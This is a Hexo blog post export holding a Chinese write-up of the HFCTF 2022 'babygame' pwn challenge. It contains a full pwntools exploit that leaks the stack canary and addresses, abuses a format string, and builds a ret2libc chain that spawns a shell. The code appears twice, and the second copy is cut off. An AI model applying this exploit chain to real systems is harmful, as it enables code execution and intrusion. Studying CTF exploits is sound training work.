{"title":"[2022HFCTF] Pwn babygame","date":"2022-03-22T11:04:57.000Z","toc":true,"source":"_posts/HFCTF-Pwn-babygame.md","raw":"---\ntitle: \"[2022HFCTF] Pwn babygame\"\ncomments: true\ntoc: true\ndate: 2022-03-22 19:04:57\ntags:  \n\t- CTF\n\t- HFCTF\n\t- Pwn\n---\n\n\n\n# babygame\n\n## 题目附件\n\nhttps://gitee.com/csomebro/ctftask/blob/master/20220-03_HFCTF/babygame.tar\n\n## 分析\n\n漏洞点就是栈溢出+格式化字符串，保护全开，需要泄露canary、函数加载地址、libc加载地址、栈地址。\n\n![image-20220322191413025](HFCTF-Pwn-babygame/image-20220322191413025.png)\n\n可以在read的时候将，v5的值覆盖，从而操控seed\n\n![image-20220322191517350](HFCTF-Pwn-babygame/image-20220322191517350.png)\n\n总结\n\n1. 第一次read的时候，输入到覆盖canary的最低字节，在printf(\"%s\")泄露canary地址，同时在gdb调试的时候发现同时会泄露栈地址\n2. attack_random之后进入格式化字符串，此时需要泄露函数加载地址，并且需要修改函数返回地址组最低位为0x39（调试的时候发现可以同时泄露libc加载地址）\n3. 重新进入printf(buf)中，利用pwnlib中的fmtstr_payload修改函数返回地址到main函数开始\n4. 此时回到read(0, buf, 0x256)，正式进入栈溢出，ret2libc。\n\n## exp\n\n```python\nfrom pwn import *\nimport time\n\ncontext.log_level = 'info'\n\n\ndef rand_():\n    rd.sendlineafter('>', '1')\n    rd.recvuntil('!>')\n    return int(rd.recvuntil('\\n'), 16)\n\ndef attack_rand():\n    tmp = rand_() % 3\n    if tmp == 0:\n        return 1\n    elif tmp == 1:\n        return 2\n    elif tmp == 2:\n        return 0\n\nio = process(['./ld-2.31.so', './babygame'], env={'LD_PRELOAD': './libc-2.31.so'})\n# io = remote('120.25.205.249', 38573)\n# rd = process('./rd')\n# gdb.attach(io)\n\ndef pwn():\n    global io, rd\n    tmppp = 0x210\n    while True:\n        io.sendlineafter('Please input your name:', '1' * (0x108))\n        rd.sendlineafter('>', str(int('0x31313131', 16)))\n\n        io.recvuntil('111\\n')\n        canary = io.recv(7).rjust(8,'\\x00')\n        canary = u64(canary)\n        log.success('canary: '+hex(canary))\n\n        inp = io.recv(6).ljust(8, '\\x00')\n        inp = u64(inp)\n        log.success('stack: '+hex(inp))\n\n\n        context.clear(arch = 'amd64', log_level='info')\n\n        for _ in range(100):\n            io.sendlineafter(': \\n', str(attack_rand()))\n\n        context.clear(arch = 'amd64', log_level='debug')\n        # p1 = \"-%p- -%p-\"\n        # p = fmtstr_payload(6, {inp-0x210: 0x39}, write_size='byte').replace('lln', 'hhn')\n\n        p1 = '-%41$p--%27$p-'\n        tmp = 0x39 - 0x22\n        pt = \"%\" +str(tmp)+ \"c\" + \"%10$hhn\"\n        p = p1 + '[' * (0x10 - len(p1)) + pt + 'b' * (0x10-len(pt)) + p64(inp-tmppp)\n\n        io.sendlineafter('Good luck to you.', p)\n\n        # s = io.recvuntil('[' * (0x10 - len(p1)))\n        # print s\n        # print hex(len(s))\n\n        io.recvuntil('-')\n        func_addr = int(io.recvuntil('-',drop=True), 16) - 0x000001543\n        log.success('func_addr:' + hex(func_addr))\n\n        io.recvuntil('-')\n        atoi_addr = int(io.recvuntil('-', drop=True), 16) - 20\n        log.success('atoi_addr:' + hex(atoi_addr))\n\n\n        libc = ELF('./libc-2.31.so')\n        libc_base = atoi_addr - libc.sym['atoi']\n        log.success('libc_base:' + hex(libc_base))\n        context.clear(arch = 'amd64', log_level='info')\n        p = fmtstr_payload(6, {inp-tmppp: func_addr+0x000000014B6}, write_size='byte')\n\n        try:\n            io.sendlineafter('Good luck to you.', p)\n\n            pop_rdi = 0x0015D2 + 1\n            sys_addr = libc.sym['system']\n\n            binsh = libc.search('/bin/sh').next()\n\n            # gdb.attach(io)\n\n            p = 'a' * 0x108 + p64(canary) + p64(0) * 3 + p64(pop_rdi+func_addr+1) + p64(pop_rdi+func_addr) + p64(binsh + libc_base) + p64(sys_addr+libc_base)\n            io.sendlineafter('Please input your name:', p)\n            io.sendlineafter(': \\n', str(attack_rand()+1))\n            print hex(tmppp)\n            break\n        except:\n            tmppp += 8\n            log.info(\"tmp:  \", hex(tmppp))\n            # io.close()\n            rd.close()\n            io = process(['./ld-2.31.so', './babygame'], env={'LD_PRELOAD': './libc-2.31.so'})\n            # io = remote('120.25.205.249', 38573)\n            rd = process('./rd')\n\n\n\npwn()\nio.interactive()\n```\n\n小插曲：原来脚本地能跑通，远程打不通，然后我也没注意到q群有说明是更新了附件，自我分析了一点，怀疑是canary底下的栈地址本地和远程的偏移量不同，所以写了一个偏移量的爆破。\n\n","slug":"HFCTF-Pwn-babygame","published":true,"updated":"2025-10-28T08:00:40.755Z","_id":"cuidNFSvsK8ZtlWPAbpKjMaJp","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"babygame\"><a href=\"#babygame\" class=\"headerlink\" title=\"babygame\"></a>babygame</h1><h2 id=\"题目附件\"><a href=\"#题目附件\" class=\"headerlink\" title=\"题目附件\"></a>题目附件</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/20220-03_HFCTF/babygame.tar\">https://gitee.com/csomebro/ctftask/blob/master/20220-03_HFCTF/babygame.tar</a></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>漏洞点就是栈溢出+格式化字符串，保护全开，需要泄露canary、函数加载地址、libc加载地址、栈地址。</p>\n<p><img src=\"/p/HFCTF-Pwn-babygame/image-20220322191413025.png\" alt=\"image-20220322191413025\"></p>\n<p>可以在read的时候将，v5的值覆盖，从而操控seed</p>\n<p><img src=\"/p/HFCTF-Pwn-babygame/image-20220322191517350.png\" alt=\"image-20220322191517350\"></p>\n<p>总结</p>\n<ol>\n<li>第一次read的时候，输入到覆盖canary的最低字节，在printf(“%s”)泄露canary地址，同时在gdb调试的时候发现同时会泄露栈地址</li>\n<li>attack_random之后进入格式化字符串，此时需要泄露函数加载地址，并且需要修改函数返回地址组最低位为0x39（调试的时候发现可以同时泄露libc加载地址）</li>\n<li>重新进入printf(buf)中，利用pwnlib中的fmtstr_payload修改函数返回地址到main函数开始</li>\n<li>此时回到read(0, buf, 0x256)，正式进入栈溢出，ret2libc。</li>\n</ol>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rand_</span>():</span><br><span class=\"line\">    rd.sendlineafter(<span class=\"string\">&#x27;&gt;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    rd.recvuntil(<span class=\"string\">&#x27;!&gt;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(rd.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">attack_rand</span>():</span><br><span class=\"line\">    tmp = rand_() % <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tmp == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> tmp == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> tmp == <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process([<span class=\"string\">&#x27;./ld-2.31.so&#x27;</span>, <span class=\"string\">&#x27;./babygame&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: <span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&#x27;120.25.205.249&#x27;, 38573)</span></span><br><span class=\"line\"><span class=\"comment\"># rd = process(&#x27;./rd&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> io, rd</span><br><span class=\"line\">    tmppp = <span class=\"number\">0x210</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;Please input your name:&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span> * (<span class=\"number\">0x108</span>))</span><br><span class=\"line\">        rd.sendlineafter(<span class=\"string\">&#x27;&gt;&#x27;</span>, <span class=\"built_in\">str</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;0x31313131&#x27;</span>, <span class=\"number\">16</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;111\\n&#x27;</span>)</span><br><span class=\"line\">        canary = io.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">        canary = u64(canary)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;canary: &#x27;</span>+<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">        inp = io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">        inp = u64(inp)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;stack: &#x27;</span>+<span class=\"built_in\">hex</span>(inp))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        context.clear(arch = <span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;info&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;: \\n&#x27;</span>, <span class=\"built_in\">str</span>(attack_rand()))</span><br><span class=\"line\"></span><br><span class=\"line\">        context.clear(arch = <span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># p1 = &quot;-%p- -%p-&quot;</span></span><br><span class=\"line\">        <span class=\"comment\"># p = fmtstr_payload(6, &#123;inp-0x210: 0x39&#125;, write_size=&#x27;byte&#x27;).replace(&#x27;lln&#x27;, &#x27;hhn&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">        p1 = <span class=\"string\">&#x27;-%41$p--%27$p-&#x27;</span></span><br><span class=\"line\">        tmp = <span class=\"number\">0x39</span> - <span class=\"number\">0x22</span></span><br><span class=\"line\">        pt = <span class=\"string\">&quot;%&quot;</span> +<span class=\"built_in\">str</span>(tmp)+ <span class=\"string\">&quot;c&quot;</span> + <span class=\"string\">&quot;%10$hhn&quot;</span></span><br><span class=\"line\">        p = p1 + <span class=\"string\">&#x27;[&#x27;</span> * (<span class=\"number\">0x10</span> - <span class=\"built_in\">len</span>(p1)) + pt + <span class=\"string\">&#x27;b&#x27;</span> * (<span class=\"number\">0x10</span>-<span class=\"built_in\">len</span>(pt)) + p64(inp-tmppp)</span><br><span class=\"line\"></span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;Good luck to you.&#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># s = io.recvuntil(&#x27;[&#x27; * (0x10 - len(p1)))</span></span><br><span class=\"line\">        <span class=\"comment\"># print s</span></span><br><span class=\"line\">        <span class=\"comment\"># print hex(len(s))</span></span><br><span class=\"line\"></span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">        func_addr = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>,drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>) - <span class=\"number\">0x000001543</span></span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;func_addr:&#x27;</span> + <span class=\"built_in\">hex</span>(func_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">        atoi_addr = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>) - <span class=\"number\">20</span></span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;atoi_addr:&#x27;</span> + <span class=\"built_in\">hex</span>(atoi_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">        libc_base = atoi_addr - libc.sym[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span> + <span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">        context.clear(arch = <span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;info&#x27;</span>)</span><br><span class=\"line\">        p = fmtstr_payload(<span class=\"number\">6</span>, &#123;inp-tmppp: func_addr+<span class=\"number\">0x000000014B6</span>&#125;, write_size=<span class=\"string\">&#x27;byte&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;Good luck to you.&#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\">            pop_rdi = <span class=\"number\">0x0015D2</span> + <span class=\"number\">1</span></span><br><span class=\"line\">            sys_addr = libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">            binsh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">            p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x108</span> + p64(canary) + p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span> + p64(pop_rdi+func_addr+<span class=\"number\">1</span>) + p64(pop_rdi+func_addr) + p64(binsh + libc_base) + p64(sys_addr+libc_base)</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;Please input your name:&#x27;</span>, p)</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;: \\n&#x27;</span>, <span class=\"built_in\">str</span>(attack_rand()+<span class=\"number\">1</span>))</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(tmppp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            tmppp += <span class=\"number\">8</span></span><br><span class=\"line\">            log.info(<span class=\"string\">&quot;tmp:  &quot;</span>, <span class=\"built_in\">hex</span>(tmppp))</span><br><span class=\"line\">            <span class=\"comment\"># io.close()</span></span><br><span class=\"line\">            rd.close()</span><br><span class=\"line\">            io = process([<span class=\"string\">&#x27;./ld-2.31.so&#x27;</span>, <span class=\"string\">&#x27;./babygame&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: <span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class=\"line\">            <span class=\"comment\"># io = remote(&#x27;120.25.205.249&#x27;, 38573)</span></span><br><span class=\"line\">            rd = process(<span class=\"string\">&#x27;./rd&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pwn()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>小插曲：原来脚本地能跑通，远程打不通，然后我也没注意到q群有说明是更新了附件，自我分析了一点，怀疑是canary底下的栈地址本地和远程的偏移量不同，所以写了一个偏移量的爆破。</p>\n","excerpt":"","more":"<h1 id=\"babygame\"><a href=\"#babygame\" class=\"headerlink\" title=\"babygame\"></a>babygame</h1><h2 id=\"题目附件\"><a href=\"#题目附件\" class=\"headerlink\" title=\"题目附件\"></a>题目附件</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/20220-03_HFCTF/babygame.tar\">https://gitee.com/csomebro/ctftask/blob/master/20220-03_HFCTF/babygame.tar</a></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>漏洞点就是栈溢出+格式化字符串，保护全开，需要泄露canary、函数加载地址、libc加载地址、栈地址。</p>\n<p><img src=\"/p/HFCTF-Pwn-babygame/image-20220322191413025.png\" alt=\"image-20220322191413025\"></p>\n<p>可以在read的时候将，v5的值覆盖，从而操控seed</p>\n<p><img src=\"/p/HFCTF-Pwn-babygame/image-20220322191517350.png\" alt=\"image-20220322191517350\"></p>\n<p>总结</p>\n<ol>\n<li>第一次read的时候，输入到覆盖canary的最低字节，在printf(“%s”)泄露canary地址，同时在gdb调试的时候发现同时会泄露栈地址</li>\n<li>attack_random之后进入格式化字符串，此时需要泄露函数加载地址，并且需要修改函数返回地址组最低位为0x39（调试的时候发现可以同时泄露libc加载地址）</li>\n<li>重新进入printf(buf)中，利用pwnlib中的fmtstr_payload修改函数返回地址到main函数开始</li>\n<li>此时回到read(0, buf, 0x256)，正式进入栈溢出，ret2libc。</li>\n</ol>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rand_</span>():</span><br><span class=\"line\">    rd.sendlineafter(<span class=\"string\">&#x27;&gt;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    rd.recvuntil(<span class=\"string\">&#x27;!&gt;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(rd.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">attack_rand</span>():</span><br><span class=\"line\">    tmp = rand_() % <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tmp == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> tmp == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> tmp == <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process([<span class=\"string\">&#x27;./ld-2.31.so&#x27;</span>, <span class=\"string\">&#x27;./babygame&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: <span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&#x27;120.25.205.249&#x27;, 38573)</span></span><br><span class=\"line\"><span class=\"comment\"># rd = process(&#x27;./rd&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> io, rd</span><br><span class=\"line\">    tmppp = <span class=\"number\">0x210</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;Please input your name:&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span> * (<span class=\"number\">0x108</span>))</span><br><span class=\"line\">        rd.sendlineafter(<span class=\"string\">&#x27;&gt;&#x27;</span>, <span class=\"built_in\">str</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;0x31313131&#x27;</span>, <span class=\"number\">16</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;111\\n&#x27;</span>)</span><br><span class=\"line\">        canary = io.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">        canary = u64(canary)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;canary: &#x27;</span>+<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">        inp = io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">        inp = u64(inp)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;stack: &#x27;</span>+<span class=\"built_in\">hex</span>(inp))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        context.clear(arch = <span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;info&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;: \\n&#x27;</span>, <span class=\"built_in\">str</span>(attack_rand()))</span><br><span class=\"line\"></span><br><span class=\"line\">        context.clear(arch = <span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># p1 = &quot;-%p- -%p-&quot;</span></span><br><span class=\"line\">        <span class=\"comment\"># p = fmtstr_payload(6, &#123;inp-0x210: 0x39&#125;, write_size=&#x27;byte&#x27;).replace(&#x27;lln&#x27;, &#x27;hhn&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">        p1 = <span class=\"string\">&#x27;-%41$p--%27$p-&#x27;</span></span><br><span class=\"line\">        tmp = <span class=\"number\">0x39</span> - <span class=\"number\">0x22</span></span><br><span class=\"line\">        pt = <span class=\"string\">&quot;%&quot;</span> +<span class=\"built_in\">str</span>(tmp)+ <span class=\"string\">&quot;c&quot;</span> + <span class=\"string\">&quot;%10$hhn&quot;</span></span><br><span class=\"line\">        p = p1 + <span class=\"string\">&#x27;[&#x27;</span> * (<span class=\"number\">0x10</span> - <span class=\"built_in\">len</span>(p1)) + pt + <span class=\"string\">&#x27;b&#x27;</span> * (<span class=\"number\">0x10</span>-<span class=\"built_in\">len</span>(pt)) + 